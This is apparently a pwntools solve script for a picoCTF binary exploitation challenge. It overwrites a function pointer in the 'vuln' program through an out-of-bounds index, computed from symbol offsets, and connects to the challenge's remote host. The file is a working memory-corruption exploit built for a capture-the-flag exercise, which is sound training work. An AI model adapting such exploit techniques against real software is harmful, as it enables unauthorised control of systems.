#!/usr/bin/env python3
from pwn import *
import monkeyhex
import time
import argparse
import re
from functools import partial
import logging
import ctypes

# Run with ipython3 -i solve.py -- DEBUG <one_gadget>

parser = argparse.ArgumentParser()
parser.add_argument("one_gadget", type=partial(int, base=0), nargs=argparse.REMAINDER)
argparse_args = parser.parse_args()

# context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-e']

# default libc path for some dists is /usr/lib/libc.so.6
# lib = ELF('/lib/x86_64-linux-gnu/libc.so.6') if not args.REMOTE else ELF('libc.so.6')
# lib.sym['binsh'] = lib.offset_to_vaddr(lib.data.find(b'/bin/sh'))
# lib.sym['one_gadget'] = argparse_args.one_gadget[0] if argparse_args.one_gadget else 0
binary = context.binary = ELF('vuln')

def attach_gdb(p, commands=None):
    """Template to run gdb with predefined commands on a process."""
    val = """
    c
    """ if commands is None else commands
    res = gdb.attach(p, val)
    pause()
    return res


def new_proc(start_gdb=False, val=None):
    """Start a new process with predefined debug operations"""
    env = dict()
    # env['LD_LIBRARY_PATH'] = os.getcwd()
    # patchelf --set-interpreter "$(ls ld-*.so)" vuln
    # ln -s libc-*.so libc.so.6
    p = process(binary.path, env=env)
    if start_gdb is True:
        attach_gdb(p, val)
    return p

def bnot(n, numbits=context.bits):
    return (1 << numbits) -1 -n

def align(val, align_to):
    return val & bnot(align_to - 1)

def batch(it, sz):
    length = len(it)
    for i in range(0, length, sz):
        yield it[i:i+sz]

p = new_proc(context.log_level == logging.DEBUG) if not args.REMOTE else remote('saturn.picoctf.net', 53739)
# do leak / payload gen here

payload = b''

story = b'a'*13 + b'L'

p.sendlineafter(b">> ", story)

index = (binary.sym['check'] - binary.sym['fun']) // 4

overwrite_val = binary.sym['easy_checker'] - binary.sym['hard_checker']

p.sendlineafter(b'10.\n', str(index).encode() + b' ' + str(overwrite_val).encode())

time.sleep(2)
ret = p.read()
print(ret)
# p.send(cyclic(0x200) + b'\n')
# p.interactive()
